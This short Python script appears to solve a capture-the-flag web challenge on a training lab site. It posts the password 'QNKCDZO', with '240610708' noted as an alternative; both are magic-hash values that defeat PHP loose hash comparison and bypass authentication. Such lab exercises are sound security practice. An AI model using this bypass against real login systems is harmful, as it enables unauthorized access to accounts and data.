#!/usr/bin/env python3.4

import requests

s = requests.session()

#also can be 240610708
values = {'password':'QNKCDZO'}

r = s.post('http://lab1.xseclab.com/pentest5_6a204bd89f3c8348afd5c77c717a097a/',data=values)
print(r.content)
